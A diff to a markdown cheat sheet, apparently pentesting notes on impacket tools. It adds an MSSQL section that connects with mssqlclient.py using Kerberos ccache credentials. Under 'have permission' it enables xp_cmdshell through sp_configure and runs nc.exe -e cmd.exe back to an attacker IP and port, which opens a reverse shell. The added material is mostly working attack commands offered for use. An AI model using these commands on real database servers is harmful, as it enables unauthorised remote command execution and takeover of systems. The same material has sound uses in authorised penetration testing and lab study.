@@ -382,9 +382,23 @@ python3 smbclient.py -no-pass -k <domain>/<username>@<targetName or ip>
 
 ### impacket other services
 
+:label: MSSQL
+
 ```shell
 python3 mssqlclient.py [[domain/]username[:password]@]<targetName or ip> -k -no-pass
 # -k -no-pass: use the credentials in the ccache file for Kerberos authentication
+```
+
+have permission
+
+```MSSQL
+EXEC sp_configure 'show advanced options', '1'
+RECONFIGURE
+
+EXEC sp_configure 'xp_cmdshell', '1' 
+RECONFIGURE
+
+EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe -e cmd.exe <attacker ip> <attacker port>';
 ```
 
 ### :open_file_folder: Test Environment
